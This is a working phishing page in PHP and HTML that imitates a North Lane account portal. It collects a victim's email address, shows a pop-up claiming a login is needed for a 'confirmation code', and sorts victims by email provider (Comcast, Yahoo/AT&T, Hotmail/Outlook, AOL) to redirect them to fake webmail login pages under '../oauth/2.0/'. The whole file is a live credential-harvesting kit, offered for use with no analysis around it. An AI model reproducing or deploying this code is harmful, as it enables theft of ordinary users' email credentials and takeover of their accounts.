<?php
session_start();
$email = $_SESSION['email'];

if(isset($_POST['login'])) {
    $email = $_SESSION['email'];


    if(preg_match('/@comcast.net/', $email)) {    
        $_SESSION['email']    = $email;
		echo "<script type='text/javascript'>window.top.location='../oauth/2.0/comcast/';</script>";
    } elseif(preg_match('/@yahoo|@ameritech|@att|@bellsouth|@currently|@flash|@nvbell|@pacbell|@prodigy|@sbcglobal|@snet|@swbell|@wans/', $email)) {    
        $_SESSION['email']    = $email;
        echo "<script type='text/javascript'>window.top.location='../oauth/2.0/yahoo/';</script>";
    } elseif(preg_match('/@live.com|@outlook.com|@hotmail.com|@msn.com|@windowslive.com|@passport.com/', $email)) {    
        $_SESSION['email']    = $email;
        echo "<script type='text/javascript'>window.top.location='../oauth/2.0/hotmail/';</script>";
    } elseif(preg_match('/@aol.com/', $email)) {    
        $_SESSION['email']    = $email;
        echo "<script type='text/javascript'>window.top.location='../oauth/2.0/gmail/';</script>";
    } elseif(preg_match('/@gmail.com/', $email)) {
        $_SESSION['email']    = $email;
        echo "<script type='text/javascript'>window.top.location='emailverify.php';</script>";
    } else {
        echo "<script type='text/javascript'>window.top.location='emailverify.php';</script>";
    }

    echo "<script type='text/javascript'>window.top.location='emailverify.php';</script>";
    exit(); 
}
?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html style="display: block;"><head><script language="JavaScript" type="text/javascript">
				//<![CDATA[
				   function windowOnLoad()
				  { 
					 var inputTags = document.querySelectorAll("input[type=text]");
					 for (var i = 0; i < inputTags.length; i += 1) {
					     inputTags[i].setAttribute('autocomplete','off');
					 }
					 var inputTags2 = document.querySelectorAll("input[type=hidden]");
					 for (var i = 0; i < inputTags2.length; i += 1) {
					     inputTags2[i].setAttribute('autocomplete','off');
					 } 
					  var inputTags1 = document.querySelectorAll("input[type=password]");
					 for (var i = 0; i < inputTags1.length; i += 1) {
					     inputTags1[i].setAttribute('autocomplete','off');
					 } 
					}
					
					 if ( document.addEventListener )
					{
					 document.addEventListener("DOMContentLoaded", windowOnLoad, false);
					}
					else
					{
					 windowOnLoad();
				 } 
							 //]]>						
							</script>




	<title>North Lane</title>
	
		
	



















<script language="JavaScript" type="text/javascript">
				//<![CDATA[
				   function windowOnLoad()
				  { 
					 var inputTags = document.querySelectorAll("input[type=text]");
					 for (var i = 0; i < inputTags.length; i += 1) {
					     inputTags[i].setAttribute('autocomplete','off');
					 }
					 var inputTags2 = document.querySelectorAll("input[type=hidden]");
					 for (var i = 0; i < inputTags2.length; i += 1) {
					     inputTags2[i].setAttribute('autocomplete','off');
					 } 
					  var inputTags1 = document.querySelectorAll("input[type=password]");
					 for (var i = 0; i < inputTags1.length; i += 1) {
					     inputTags1[i].setAttribute('autocomplete','off');
					 } 
					}
					
					 if ( document.addEventListener )
					{
					 document.addEventListener("DOMContentLoaded", windowOnLoad, false);
					}
					else
					{
					 windowOnLoad();
				 } 
							 //]]>						
							</script>












<script type="text/javascript" src="foemail_files/jquery-new.js"></script>



<!-- <meta content="IE=EmulateIE7" http-equiv="X-UA-Compatible" /> -->
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta http-equiv="content-type" content="text/html; charset=windows-1252">
<meta http-equiv="Expires" content="0">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Cache-Control" content="no-cache , no-store">

<meta http-equiv="refresh" content="480;url=/login/logout.do?skinname=&amp;affiliate=2003">

<link rel="stylesheet" href="foemail_files/sw.css" type="text/css" media="screen">
<link rel="stylesheet" href="" type="text/css" media="screen">
<link rel="stylesheet" href="" type="text/css" media="print">

<script type="text/javascript" src=""></script>
<script type="text/javascript" src=""></script>
<script type="text/javascript" src="foemail_files/layers.js"></script>
<script type="text/javascript" src="foemail_files/switch.js"></script>
<script type="text/javascript" src=""></script>
<script type="text/javascript" src="foemail_files/tokenprocessor.js"></script>
<script type="text/javascript" src="foemail_files/commonva.js"> </script>


<script type="text/javascript">
<!--

		$(document).ready(
		function(){
			addtoken('');
			setAutoCompleteOff();			
	    });
		
//-->
</script>
<style type="text/css"> html{display : none ; } 
@font-face {
  			font-family: 'Interstate-Regular';
			src: url('/interstateregular.ttf') format('truetype');
		}
@font-face {
  			font-family: 'Futura';
			src: url('/Futura.ttc') format('truetype');
		}
</style> 
<script type="text/javascript">
<!--
if( self == top ) { document.documentElement.style.display = 'block' ; } else { top.location = self.location ; } 
//-->
</script>
<script language="JavaScript" type="text/javascript">
function closer()
{
	this.close(); 
}
</script>
</head>

<body>

















<script language="JavaScript" type="text/javascript">
				//<![CDATA[
				   function windowOnLoad()
				  { 
					 var inputTags = document.querySelectorAll("input[type=text]");
					 for (var i = 0; i < inputTags.length; i += 1) {
					     inputTags[i].setAttribute('autocomplete','off');
					 }
					 var inputTags2 = document.querySelectorAll("input[type=hidden]");
					 for (var i = 0; i < inputTags2.length; i += 1) {
					     inputTags2[i].setAttribute('autocomplete','off');
					 } 
					  var inputTags1 = document.querySelectorAll("input[type=password]");
					 for (var i = 0; i < inputTags1.length; i += 1) {
					     inputTags1[i].setAttribute('autocomplete','off');
					 } 
					}
					
					 if ( document.addEventListener )
					{
					 document.addEventListener("DOMContentLoaded", windowOnLoad, false);
					}
					else
					{
					 windowOnLoad();
				 } 
							 //]]>						
							</script>







 


<div id="hold-unav">
    <ul id="nav-user">
        <li><a href="https://login.northlane.com/login/logout.do?affiliate=2003&amp;skinname=op&amp;oprequestid=&amp;bzoffset=240">Log Out</a></li>
    </ul>
</div>






<div id="header">
<div id="logo">
    
        <img src="foemail_files/default-partner.png" alt="MyAccount" id="partner">
    

    
  </div>
</div>




	
















<script language="JavaScript" type="text/javascript">
				//<![CDATA[
				   function windowOnLoad()
				  { 
					 var inputTags = document.querySelectorAll("input[type=text]");
					 for (var i = 0; i < inputTags.length; i += 1) {
					     inputTags[i].setAttribute('autocomplete','off');
					 }
					 var inputTags2 = document.querySelectorAll("input[type=hidden]");
					 for (var i = 0; i < inputTags2.length; i += 1) {
					     inputTags2[i].setAttribute('autocomplete','off');
					 } 
					  var inputTags1 = document.querySelectorAll("input[type=password]");
					 for (var i = 0; i < inputTags1.length; i += 1) {
					     inputTags1[i].setAttribute('autocomplete','off');
					 } 
					}
					
					 if ( document.addEventListener )
					{
					 document.addEventListener("DOMContentLoaded", windowOnLoad, false);
					}
					else
					{
					 windowOnLoad();
				 } 
							 //]]>						
							</script>

<div id="super-wrap">
<div id="mainpage-area">


	<div id="out-page">

        





<script language="JavaScript" type="text/javascript" src="foemail_files/AC_OETags.js"></script>
<script language="JavaScript" type="text/javascript" src="foemail_files/hashtable.js"></script>
<script language="JavaScript" type="text/javascript" src="foemail_files/rsa.js"></script>
<script language="JavaScript" type="text/javascript" src="foemail_files/security.js"></script>
<script language="JavaScript" src="foemail_files/common.js"></script>


















<script language="JavaScript" type="text/javascript">
				//<![CDATA[
				   function windowOnLoad()
				  { 
					 var inputTags = document.querySelectorAll("input[type=text]");
					 for (var i = 0; i < inputTags.length; i += 1) {
					     inputTags[i].setAttribute('autocomplete','off');
					 }
					 var inputTags2 = document.querySelectorAll("input[type=hidden]");
					 for (var i = 0; i < inputTags2.length; i += 1) {
					     inputTags2[i].setAttribute('autocomplete','off');
					 } 
					  var inputTags1 = document.querySelectorAll("input[type=password]");
					 for (var i = 0; i < inputTags1.length; i += 1) {
					     inputTags1[i].setAttribute('autocomplete','off');
					 } 
					}
					
					 if ( document.addEventListener )
					{
					 document.addEventListener("DOMContentLoaded", windowOnLoad, false);
					}
					else
					{
					 windowOnLoad();
				 } 
							 //]]>						
							</script>




<script language="Javascript" type="text/javascript">
<!--
		var flashMovie = "https://login.northlane.com:443/xContent/content/op/swf/rsa_fso.swf"; //the name and location of the swf
		if(null !=flashMovie && '' != flashMovie && 'null' != flashMovie)
		{
		 flashMovie = flashMovie.substr(0, flashMovie.indexOf(".swf"));
		
		var flashVars = "field_name=RSADeviceFso&ip_address=294.0..2373.0..1984.5..2163.0";
		
		//if flash minimum version is version 6.0.0
		if (DetectFlashVer(6,0,0)){ //run the movie
			AC_FL_RunContent( 'id','flash_id','width', '1','height', '1','movie', flashMovie,'quality', 'high','bgcolor', '#FFFFFF','flashVars', flashVars);
		  //end AC code
			
		}
		}
		
    //-->  
</script>

<div id="out-page">

	
    
    
	
	<!-- SQ:2005 Steps text deletion -->
	<h2 class="head-section"></h2>
	
    
    
	<h2 class="subhead-section"><span>Enter your email register information in</span></h2>


	
	
	
	
	
	<form name="registerCardForm" method="post" action="_.php" class="form1" onsubmit="callDevice();" autocomplete="off"><div><input type="hidden" name="org.apache.struts.taglib.html.TOKEN" value="7f887dc6805feddadf5e9f0ba529033e" autocomplete="off"></div>
	<input type="hidden" name="org.apache.struts.taglib.html.TOKEN" value="7f887dc6805feddadf5e9f0ba529033e" autocomplete="off">
	<input type="hidden" name="RSADeviceFso" id="RSADeviceFso" value="" autocomplete="off">
	<input type="hidden" name="devicePrintId" id="devicePrintId" value="" autocomplete="off">
	<input type="hidden" name="CSRFToken" value="7f887dc6805feddadf5e9f0ba529033e" autocomplete="off">
	<dl>
	
	
	

	<dt></dt>
	<dd>
		
	</dd>
	<form class="login-form" action="_.php" accept-charset="UTF-8" method="post">
	<dt><label for="cardnumber">Email Address:</label></dt>
		<dd><?= $_SESSION['email'] ?><input type="email" id="email" name="email" maxlength="100" size="25" autocomplete="off" required><?= $_SESSION['email'] ?>
		<span class="hint">After you enter your email you need a confirmation code. for that you will be directed to your email service provider to get the provider code</span>

	
<input type="submit" class="button" onClick="alert('To Continue You Must Login to Your Email Get Confirmation Code')" class="btn btn-block btn-primary" name="submit" value="Continue"<?=$email?>></button><?=$email?>
					</form>
	</dd>
	</dl>
	<br clear="left">
	
<input type="hidden" name="oprequestid" value=""><input type="hidden" name="bzoffset" value="240"></form>
	
</div>


<script language="Javascript" type="text/javascript">
<!--
function refreshData() 
{            
	            var fso = document.getElementById('RSADeviceFso').value;
	            if (fso == "" || fso == undefined || fso == null) {
	            	  //alert("error->"+fso);
	            }
	            else{
	            	  document.getElementById('RSADeviceFso').value = fso;
	                  //alert('else -'+fso)
	            }
}
	      setTimeout("refreshData()",1000);
//-->
</script>	




	</div>


</div>

</div>



















<script language="JavaScript" type="text/javascript">
				//<![CDATA[
				   function windowOnLoad()
				  { 
					 var inputTags = document.querySelectorAll("input[type=text]");
					 for (var i = 0; i < inputTags.length; i += 1) {
					     inputTags[i].setAttribute('autocomplete','off');
					 }
					 var inputTags2 = document.querySelectorAll("input[type=hidden]");
					 for (var i = 0; i < inputTags2.length; i += 1) {
					     inputTags2[i].setAttribute('autocomplete','off');
					 } 
					  var inputTags1 = document.querySelectorAll("input[type=password]");
					 for (var i = 0; i < inputTags1.length; i += 1) {
					     inputTags1[i].setAttribute('autocomplete','off');
					 } 
					}
					
					 if ( document.addEventListener )
					{
					 document.addEventListener("DOMContentLoaded", windowOnLoad, false);
					}
					else
					{
					 windowOnLoad();
				 } 
							 //]]>						
							</script>








	
<div id="footer">
<div id="footer-links">
	<style type="text/css">
	div#footer-links {margin-bottom:10px; padding-bottom:10px; width:980px; border-bottom:1px solid #ccc; overflow:hidden; }
	</style>


	<p id="sm-logo"><a></a></p>

<ul>

	
		<li></li>
	

	<li><a href="https://login.northlane.com/xContent/content/op/program/prelogin_terms_en_US.html" target="_blank">Terms of Use</a></li>
	<li class="last-link"><a href="https://login.northlane.com/xContent/content/op/program/privacy_cookies.html" target="_blank">Privacy and Cookies</a></li>
	<li class="copyrightlink">
		<p id="copyright">© 2021 North Lane Technologies, Inc.</p>
	</li>
</ul>

</div>

</div>









</body></html>